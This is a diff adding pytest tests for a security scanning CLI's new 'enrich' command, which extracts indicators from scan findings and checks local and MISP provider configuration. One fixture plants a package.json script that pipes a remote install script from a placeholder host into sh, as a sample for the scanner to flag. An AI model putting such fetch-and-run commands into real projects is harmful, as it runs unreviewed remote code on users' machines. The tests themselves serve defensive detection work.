@@ -269,6 +269,12 @@ def test_security_init_writes_gitignored_local_config(tmp_path, capsys):
     config = tmp_path / ".brigade" / "security.toml"
     assert config.is_file()
     assert 'policy = "personal"' in config.read_text()
+    assert "[enrichment]" in config.read_text()
+    assert 'provider = "local"' in config.read_text()
+    loaded = security_cmd.load_config(tmp_path)
+    assert loaded is not None
+    assert loaded.enrichment.provider == "local"
+    assert loaded.enrichment.misp_api_key_env == "MISP_API_KEY"
 
     assert security_cmd.init(target=tmp_path) == 1
     assert "already exists" in capsys.readouterr().err
@@ -344,6 +350,84 @@ def test_security_scan_writes_redacted_evidence_bundle(tmp_path, capsys):
     assert "abcd1234" not in markdown
 
 
+def test_security_enrich_writes_local_enrichment_bundle(tmp_path, capsys):
+    security_cmd.init(target=tmp_path)
+    capsys.readouterr()
+    (tmp_path / "package.json").write_text(
+        json.dumps({"scripts": {"bootstrap": "curl https://example.invalid/install.sh | sh", "tool": "npx some-tool"}})
+    )
+    output_dir = tmp_path / ".brigade" / "security" / "latest"
+    assert security_cmd.scan(target=tmp_path, fail_on="none", output_dir=output_dir) == 0
+    capsys.readouterr()
+
+    assert security_cmd.enrich(target=tmp_path, output_dir=output_dir, json_output=True) == 0
+    payload = json.loads(capsys.readouterr().out)
+    assert payload["provider"] == "local"
+    assert payload["indicator_count"] >= 3
+    assert payload["hit_count"] == 0
+    assert {item["type"] for item in payload["indicators"]} >= {"url", "domain", "npm-package"}
+    assert (output_dir / "security-enrichment.json").is_file()
+    assert (output_dir / "security-enrichment.md").is_file()
+    assert "## Enrichment" in (output_dir / "security-report.md").read_text()
+
+    assert security_cmd.review(target=tmp_path, output_dir=output_dir, json_output=True) == 0
+    review_payload = json.loads(capsys.readouterr().out)
+    assert review_payload["enrichment"]["provider"] == "local"
+
+
+def test_security_enrich_requires_provider_config(tmp_path, capsys):
+    report_dir = tmp_path / ".brigade" / "security" / "latest"
+    report_dir.mkdir(parents=True)
+    (report_dir / "security-report.json").write_text(json.dumps({"findings": [], "suppressed_findings": []}))
+
+    assert security_cmd.enrich(target=tmp_path, output_dir=report_dir) == 2
+    assert "provider is not configured" in capsys.readouterr().err
+
+
+def test_security_enrich_misp_requires_config_and_env(tmp_path, capsys):
+    config = tmp_path / ".brigade" / "security.toml"
+    config.parent.mkdir(parents=True)
+    config.write_text(
+        "\n".join(
+            [
+                'policy = "personal"',
+                'fail_on = "critical"',
+                "include_templates = false",
+                "",
+                "[enrichment]",
+                'provider = "misp"',
+                'misp_url = "https://misp.example.invalid"',
+                'misp_api_key_env = "BRIGADE_TEST_MISP_KEY"',
+                "timeout_seconds = 3",
+                'cache_path = ".brigade/security/enrichment-cache.json"',
+                "",
+            ]
+        )
+    )
+    report_dir = tmp_path / ".brigade" / "security" / "latest"
+    report_dir.mkdir(parents=True)
+    (report_dir / "security-report.json").write_text(
+        json.dumps(
+            {
+                "findings": [
+                    {
+                        "fingerprint": "0123456789abcdef",
+                        "title": "Remote MCP transport",
+                        "category": "mcp",
+                        "path": ".codex/mcp.json",
+                        "line": 1,
+                        "evidence": "remote: url=https://example.invalid/mcp",
+                    }
+                ],
+                "suppressed_findings": [],
+            }
+        )
+    )
+
+    assert security_cmd.enrich(target=tmp_path, output_dir=report_dir) == 2
+    assert "BRIGADE_TEST_MISP_KEY" in capsys.readouterr().err
+
+
 def test_security_scan_cli(tmp_path, monkeypatch):
     seen = {}
 
@@ -393,6 +477,41 @@ def test_security_review_cli(tmp_path, monkeypatch):
     monkeypatch.setattr(security_cmd, "review", fake_review)
     assert cli.main(["security", "review", "--target", str(tmp_path), "--output-dir", str(tmp_path / "out"), "--json"]) == 0
     assert seen == {"target": tmp_path, "output_dir": tmp_path / "out", "json_output": True}
+
+
+def test_security_enrich_cli(tmp_path, monkeypatch):
+    seen = {}
+
+    def fake_enrich(**kwargs):
+        seen.update(kwargs)
+        return 0
+
+    monkeypatch.setattr(security_cmd, "enrich", fake_enrich)
+    assert (
+        cli.main(
+            [
+                "security",
+                "enrich",
+                "--target",
+                str(tmp_path),
+                "--output-dir",
+                str(tmp_path / "out"),
+                "--report",
+                str(tmp_path / "report.json"),
+                "--provider",
+                "local",
+                "--json",
+            ]
+        )
+        == 0
+    )
+    assert seen == {
+        "target": tmp_path,
+        "output_dir": tmp_path / "out",
+        "report_path": tmp_path / "report.json",
+        "provider": "local",
+        "json_output": True,
+    }
 
 
 def test_security_suppress_cli(tmp_path, monkeypatch):
